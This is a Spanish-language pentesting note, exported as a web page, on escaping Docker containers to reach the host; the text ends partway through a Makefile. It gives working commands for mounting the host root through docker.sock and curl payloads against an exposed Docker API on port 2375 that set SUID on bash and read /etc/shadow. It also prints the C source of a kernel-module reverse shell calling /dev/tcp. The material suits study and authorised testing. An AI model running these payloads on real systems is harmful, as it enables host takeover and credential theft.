<!DOCTYPE html> <html><head>
		<title>Docker Breakout</title>
		<base href="..\..\..\..\..\..\../">
		<meta id="root-path" root-path="..\..\..\..\..\..\../">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
		<meta charset="UTF-8">
		<meta name="description" content="Hacking - Docker Breakout">
		<meta property="og:title" content="Docker Breakout">
		<meta property="og:description" content="Hacking - Docker Breakout">
		<meta property="og:type" content="website">
		<meta property="og:url" content="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/3.-escalada-de-privilegios/docker-breakout.html">
		<meta property="og:image" content="undefined">
		<meta property="og:site_name" content="Hacking">
		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.4.0/pixi.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="https://cdn.jsdelivr.net/npm/minisearch@6.3.0/dist/umd/index.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="Docker Breakout"><p>Docker Breakout</p></h1><div><hr></div><div><ul>
<li data-line="0">Tags: <a href="?query=tag:teoria" class="tag" target="_blank" rel="noopener">#teoria</a> <a href="?query=tag:escalada" class="tag" target="_blank" rel="noopener">#escalada</a> <a href="?query=tag:practica" class="tag" target="_blank" rel="noopener">#practica</a> </li>
</ul></div><div><hr></div><div class="heading-wrapper"><div class="heading-children"><div><p>El termino <em>docker breakout</em> hace referencia a la posibilidad que tiene un usuario legitimo o un atacante de escapar del container en el cual se encuentra, pudiendo así ganar acceso a la maquina host la cual ejecuta el container. Para realizar esto pueden existir diversas situaciones, algunas de ellas son: </p></div><div><ul>
<li data-line="0">
<h3 data-heading="Uso de monturas en el despliegue de contenedores para acceder a a archivos privilegiados del sistema host. Un atacante puede aprovecharse de las monturas para manipular los archivos del host  comprometer la seguridad del sistema." class="heading" id="Uso_de_monturas_en_el_despliegue_de_contenedores_para_acceder_a_a_archivos_privilegiados_del_sistema_host._Un_atacante_puede_aprovecharse_de_las_monturas_para_manipular_los_archivos_del_host__comprometer_la_seguridad_del_sistema.">Uso de monturas en el despliegue de contenedores para acceder a a archivos privilegiados del sistema host. Un atacante puede aprovecharse de las monturas para manipular los archivos del host  comprometer la seguridad del sistema.</h3>
</li>
<li data-line="2">
<h3 data-heading="Despliegue de contenedores con la compartición de procesos (**-pid=host**) y permisos privilegiados (**-privileged**). Un atacante podría inyectar un shellcode malicioso en un proceso en ejecución como root, lo que podría permitir al atacante tomar control del sistema host." class="heading" id="Despliegue_de_contenedores_con_la_compartición_de_procesos_(**-pid=host**)_y_permisos_privilegiados_(**-privileged**)._Un_atacante_podría_inyectar_un_shellcode_malicioso_en_un_proceso_en_ejecución_como_root,_lo_que_podría_permitir_al_atacante_tomar_control_del_sistema_host.">Despliegue de contenedores con la compartición de procesos (<strong>-pid=host</strong>) y permisos privilegiados (<strong>-privileged</strong>). Un atacante podría inyectar un shellcode malicioso en un proceso en ejecución como root, lo que podría permitir al atacante tomar control del sistema host.</h3>
</li>
<li data-line="4">
<h3 data-heading="Uso de **Portainer** para administrar el despliegue de un contenedor. Un atacante podría ingresar y manipular archivos privilegiados del sistema host mediante el uso de monturas para así escapar del contenedor." class="heading" id="Uso_de_**Portainer**_para_administrar_el_despliegue_de_un_contenedor._Un_atacante_podría_ingresar_y_manipular_archivos_privilegiados_del_sistema_host_mediante_el_uso_de_monturas_para_así_escapar_del_contenedor.">Uso de <strong>Portainer</strong> para administrar el despliegue de un contenedor. Un atacante podría ingresar y manipular archivos privilegiados del sistema host mediante el uso de monturas para así escapar del contenedor.</h3>
</li>
<li data-line="6">
<h3 data-heading="Abuso de la **API** de **Docker** por el puerto **2375** para la creación de imágenes, despligue de contenedores e inyección de comandos privilegiados en la máquina host. Un atacnte puede explotar esta API para comprometer la seguridad del host y lograr la ejecución de comandos con privilegios elevados." class="heading" id="Abuso_de_la_**API**_de_**Docker**_por_el_puerto_**2375**_para_la_creación_de_imágenes,_despligue_de_contenedores_e_inyección_de_comandos_privilegiados_en_la_máquina_host._Un_atacnte_puede_explotar_esta_API_para_comprometer_la_seguridad_del_host_y_lograr_la_ejecución_de_comandos_con_privilegios_elevados.">Abuso de la <strong>API</strong> de <strong>Docker</strong> por el puerto <strong>2375</strong> para la creación de imágenes, despligue de contenedores e inyección de comandos privilegiados en la máquina host. Un atacnte puede explotar esta API para comprometer la seguridad del host y lograr la ejecución de comandos con privilegios elevados.</h3>
</li>
</ul></div><div><hr></div></div></div><div class="heading-wrapper"><h1 data-heading="Escalada" class="heading" id="Escalada">Escalada</h1><div class="heading-children"><div class="heading-wrapper"><h2 data-heading="Demonio de docker enlazado con el contenedor por la ruta */var/run/docker.sock*" class="heading" id="Demonio_de_docker_enlazado_con_el_contenedor_por_la_ruta_*/var/run/docker.sock*"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Demonio de docker enlazado con el contenedor por la ruta <em>/var/run/docker.sock</em></h2><div class="heading-children"><div><p>Cuando hacemos <strong>docker ps</strong> o <strong>docker images</strong>, se comunica con un archivo alojado en la ruta <strong>/var/run/docker.sock</strong> el cual es un socket file que nos permite comunicarnos con el demonio de docker cuando el servicio esta activo para poder ver la información deseada. </p></div><div><p>Cual es el problema de esto? En principio ninguno, pero muchas veces en entornos de desarrollo por diversos motivos, cuando se crea un contenedor se necesita que el mismo tenga docker así como acceso a las imágenes creadas y los contenedores, por lo que muchas veces cuando se crea el contenedor de docker se suele hacer una montura de todo lo que existe en la ruta <strong>/var/run/docker.sock</strong> con la ruta del contenedor <strong>/var/run/docker.sock</strong>.<br>
(<code>docker run -v /var/run/docker.sock:/var/run/docker.sock ......</code>)</p></div><div><p>Por lo que el contenedor con docker (<strong>apt install docker.io</strong>) al realizar un <strong>docker ps</strong> o <strong>docker images</strong> podrá listar los contenedores y las imagenes de la maquina host (Por lo que podría verse a si mismo con <strong>docker ps</strong>), en lugar de recibir un error debido a que no se reconoce el servicio de docker y no se puede comunicar con la ruta <strong>/var/run/docker.sock</strong> (Que es lo que pasa en caso de que no se realice esta montura). </p></div><div><p>De esta manera, tenemos una ruta (<strong>/var/run/docker.sock</strong>) que pertenece a la maquina host y al ser la ruta que permite comunicarnos con el servicio de docker para listar imágenes, crear contenedores, etc. podemos jugar con monturas para llevar a cabo el <strong>docker breakout</strong>. </p></div><div><p><code>docker run -dit --name breakout -v /:/mnt/root {image_name}</code> Con este comando, haciendo uso de una imagen disponible, estaríamos creando un nuevo contenedor con una montura de toda la raíz del sistema host en la ruta <strong>/mnt/root</strong>, por lo que de esta manera ya tendríamos acceso al sistema completo dentro de dicha ruta. </p></div><div><hr></div></div></div><div class="heading-wrapper"><h2 data-heading="Uso de --pid=host y --privileged o asignación de capabilities especificas" class="heading" id="Uso_de_--pid=host_y_--privileged_o_asignación_de_capabilities_especificas"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Uso de --pid=host y --privileged o asignación de capabilities especificas</h2><div class="heading-children"><div class="heading-wrapper"><h4 data-heading="Shellcode = Instrucción a bajo nivel." class="heading" id="Shellcode_=_Instrucción_a_bajo_nivel."><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Shellcode = Instrucción a bajo nivel.</h4><div class="heading-children"><div><p>Cuando nos encontramos en un contenedor el cual fue creado con la flag <strong>--pid=host</strong> indica que si ejecutamos un <strong>ps -faux</strong> podemos ver los procesos de la maquina host, esto supone un riesgo ya que podríamos hacer uso de un PID de una tarea que ejecuta root para inyectar un shellcode para que nos cree un subproceso a partir del proceso, por lo que podríamos establecer una de las <a data-href="Shells" href="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/2.-explotación/conceptos-expotacion/shells.html" class="internal-link" target="_self" rel="noopener">Shells</a> (<strong>Bind Shell</strong>) mediante un shellcode (Siempre y cuando el contenedor tenga los permisos). </p></div><div><p>Si buscamos en google un script que establezca un <a data-tooltip-position="top" aria-label="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c" rel="noopener" class="external-link" href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c" target="_blank">shellcode mediante un proceso corriendo</a> , podríamos utilizarlo para editarlo haciendo uso de otros shellcodes para establecer una tarea que querramos, por ejemplo un <a data-tooltip-position="top" aria-label="https://www.exploit-db.com/exploits/41128" rel="noopener" class="external-link" href="https://www.exploit-db.com/exploits/41128" target="_blank">shellcode para establecer una bind shell por el puerto 5600</a>.</p></div><div><p>De esta manera, una vez editado el shellcode (Modificando los bytes del shellcode y el shellcode mismo), simplemente podríamos compilar el binario y si tenemos los permisos necesarios, podríamos ejecutar el mismo el cual se encargara de crear un subproceso a través del proceso seleccionado, por lo que si todo sale bien se abrirá en el puerto 5600 un bind shell para que con netcat nos podamos conectar (<strong>nc {target_ip} 5600</strong>) y tener acceso como root a la maquina host. </p></div><div><hr></div></div></div></div></div><div class="heading-wrapper"><h2 data-heading="Portainer" class="heading" id="Portainer"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Portainer</h2><div class="heading-children"><div><p><strong>Portainer</strong> es una herramienta que permite la administración y gestión de manera centralizada local o remota de docker, sean imagenes, contenedores, etc. Esta herramienta cuenta con un panel administrativo el cual en algunos casos podríamos encontrar en alguna máquina que estemos intentando vulnerar, por lo que podríamos realizar un ataque de fuerza bruta para ver si encontramos la contraseña y logramos ingresar al panel administrativo, de esta manera, una vez con acceso al panel administrativo, podríamos ver las imagenes y hacer uso de estas para crear un contenedor haciendo uso de esta y ver si existe la posibilidad de escapar del mismo, o incluso, realizar lo mismo que cuando el demonio de docker esta enlazado, ya que para que <strong>portainer</strong> tenga acceso a la información de las imagenes y demás tiene que poder ver el demonio de docker, y muchas veces este se monta en el contenedor de la sig. manera: <code>docker run -dit -p 8000:8000 -p 9000:9000 --name portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v /docker/portainer/data:/data portainer/portainer-ce </code> </p></div><div><p>Por lo que si obtenemos acceso al panel administrativo de portainer y creamos un contenedor haciendo uso de una imagen con la montura de <strong>/:/mnt/root</strong> una vez más, dentro de la ruta <strong>/mnt/root*</strong> tendríamos acceso al sistema, y esto abre una amplia variedad de posibilidades. </p></div><div><hr></div></div></div><div class="heading-wrapper"><h2 data-heading="Abusando de la API de Docker" class="heading" id="Abusando_de_la_API_de_Docker"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Abusando de la API de Docker</h2><div class="heading-children"><div><p>Esto es algo que por default no suele estar activado, pero muchas veces puede ser que nos encontremos con esto.<br>
Para activar la API de Docker, nos dirigimos al directorio <strong>/etc/docker</strong> y creamos un archivo llamado <strong>daemon.json</strong> con el contenido: </p></div><div><pre class="language-json" tabindex="0"><code class="language-json is-loaded"><span class="token punctuation">{</span><span class="token property">"hosts"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"tcp://0.0.0.0:2375"</span><span class="token punctuation">,</span> <span class="token string">"unix:///var/run/docker.sock"</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Agregamos el archivo <strong>/etc/systemd/system/docker.service.d/override.conf</strong> : </p></div><div><pre class="language-conf" tabindex="0"><code class="language-conf is-loaded">[Service]
ExecStart= 
ExecStart=/usr/bin/dockerd
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Y por ultimo recargamos el demonio  <em>systemctl daemon-reload</em> y restartiamos el servicio de docker <em>systemctl restart docker.service</em>. </p></div><div><p>Una vez que tengamos la API corriendo ya podríamos probar esto de manera local. </p></div><div><p>Cuando ganamos acceso a un contenedor y probamos diversas maneras de intentar escapar del contenedor, tal vez ninguna de las anteriores den resultado. Por lo que podríamos verificar si el puerto 2375 o 2376 esta abierto en lo que sería la maquina host.</p></div><div><p>Por ejemplo, si somos la máquina <strong>172.17.0.2</strong> intuimos que la máquina host es la <strong>0.1</strong> por lo que podríamos verificar si uno de los puertos anteriores está abierto.</p></div><div><pre class="language-bash" tabindex="0"><code class="language-bash is-loaded"><span class="token builtin class-name">echo</span> <span class="token string">''</span> <span class="token operator">&gt;</span> /dev/tcp/172.17.0.1/2375 

<span class="token builtin class-name">echo</span> <span class="token variable">$?</span> 
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Si no vemos respuesta alguna en la consola y al ejecutar <strong>echo $?</strong> vemos que el código de estado es un 0, quiere decir que el puerto esta abierto, por lo que muy probablemente este corriendo docker. En este caso, podríamos realizar el proceso de enumeración y creación de contenedores haciendo uso de páginas como <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker" rel="noopener" class="external-link" href="https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker" target="_blank">HackTricks</a>. </p></div></div></div></div></div><div class="heading-wrapper"><h1 data-heading="Payloads:" class="heading" id="Payloads:">Payloads:</h1><div class="heading-children"><div><ul>
<li data-line="0"><strong>Listar containers desde consola con CURL usando la API:</strong> <code>curl http://{ip}:2375/containers/json | jq</code></li>
<li data-line="1"><strong>Listar imágenes  desde consola con CURL usando la API:</strong> <code>curl http://{ip}:2375/images/json | jq</code></li>
<li data-line="2"><strong>Listar containers desde consola con CURL usando la API:</strong> <code>curl http://{ip}:2375/containers/json | jq</code></li>
<li data-line="3"><strong>Crear un container</strong> <code>curl  -X POST -H "Content-Type: application/json" http://{ip}:2375/containers/create?name={container_name} -d '{"Image":"{image_name}", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt/root" ], "Privileged": true}'</code> (Esto nos devolverá un ID_container)</li>
<li data-line="4"><strong>Startear el container creado:</strong> <code>curl -X POST -H "Content-Type: application/json" http://{ip}:2375/containers/{ID_container}/start?name={container_name}</code></li>
<li data-line="5"><strong>Crear ejecución de un comando:</strong> <code>curl -X POST -H "Content-Type: application/json" http://{ip}:2375/containers/{ID_container}/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "chmod u+s /mnt/root/bin/bash"]}'</code> (Esto nos devolverá un ID_command y en caso de que el comando que querramos ejecutar sea algo lo cual nos tenga que mostrar output como un cat al /etc/shadow deberíamos agregar un <code>--ouput -</code>)</li>
<li data-line="6"><strong>Ejecutar el comando creado:</strong> <code>curl -X POST -H "Content-Type: application/json" http://{ip}:2375/exec/{ID_command}/start -d '{}'</code> </li>
</ul></div><div><p>De esta manera, si vemos que la API de docker esta activa en la máquina host, podríamos crear un contenedor como lo haríamos normalmente desde consola y manipular el contenido de la máquina host, pudiendo leer el etc/shadow, agregando el permiso SUID a la bash, etc. </p></div><div><hr></div></div></div><div class="heading-wrapper"><h1 data-heading="Cap sys_module" class="heading" id="Cap_sys_module">Cap sys_module</h1><div class="heading-children"><div><p>En caso de ejecutar un <strong>linpeas.sh</strong>, o listar de manera manual las capabilities con <code>capsh --print</code> y localizar que el contenedor contiene la capabilitie <strong>sys_module</strong>, como resultado el contenedor puede insertar y/o remover modules del kerner en la máquina host del contenedor. </p></div><div><p>Una vez con la IP de la máquina host, haríamos uso del siguiente script en <strong>c</strong>.</p></div><div><pre class="language-c" tabindex="0"><code class="language-c is-loaded"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kmod.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h&gt;</span></span>
<span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"AttackDefense"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"LKM reverse shell module"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">MODULE_VERSION</span><span class="token punctuation">(</span><span class="token string">"1.0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">reverse_shell_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">return</span> <span class="token function">call_usermodelhelper</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">,</span> UMH_WAIT_EXEC<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">reverse_shell_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"Exiting\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">module_init</span><span class="token punctuation">(</span>reverse_shell_init<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">module_exit</span><span class="token punctuation">(</span>reverse_shell_exit<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Ahora habría que crear un archivotarget <strong>makefile</strong>:</p></div><div><pre class="language-makefile" tabindex="0"><code class="language-makefile is-loaded">obj-m <span class="token operator">+=</span>reverse-shell.o
<span class="token target symbol">all</span><span class="token punctuation">:</span>
	make -C /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> uname -r<span class="token punctuation">)</span>/build M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>PWD<span class="token punctuation">)</span> modules
<span class="token target symbol">clean</span><span class="token punctuation">:</span>
	make -C /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> uname -r<span class="token punctuation">)</span>/build M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>PWD<span class="token punctuation">)</span> clean
